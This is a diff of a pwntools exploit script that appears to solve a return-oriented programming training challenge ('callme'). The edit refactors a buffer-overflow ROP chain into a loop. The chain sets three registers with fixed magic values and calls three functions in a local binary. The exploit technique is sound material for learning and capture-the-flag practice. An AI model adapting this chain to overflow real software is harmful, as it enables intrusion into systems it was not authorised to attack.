@@ -9,28 +9,14 @@ context.binary = BINARY
 
 p = process(BINARY)
 
-pop_rdi_rsi_rdx_ret = 0x40093c
-ret = 0x4006be
-
 rop = b"A" * 40
-rop += p64(ret)
-rop += p64(pop_rdi_rsi_rdx_ret)
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xcafebabecafebabe)
-rop += p64(0xd00df00dd00df00d)
-rop += p64(ELF.symbols['callme_one'])
 
-rop += p64(pop_rdi_rsi_rdx_ret)
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xcafebabecafebabe)
-rop += p64(0xd00df00dd00df00d)
-rop += p64(ELF.symbols['callme_two'])
-
-rop += p64(pop_rdi_rsi_rdx_ret)
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xcafebabecafebabe)
-rop += p64(0xd00df00dd00df00d)
-rop += p64(ELF.symbols['callme_three'])
+for func in ['callme_one', 'callme_two', 'callme_three']:
+    rop += p64(0x40093c) # pop rdi ; pop rsi ; pop rdx ; ret
+    rop += p64(0xdeadbeefdeadbeef)
+    rop += p64(0xcafebabecafebabe)
+    rop += p64(0xd00df00dd00df00d)
+    rop += p64(ELF.symbols[func])
 
 log.success(f"ROP chain : {rop}")
 p.sendline(rop)
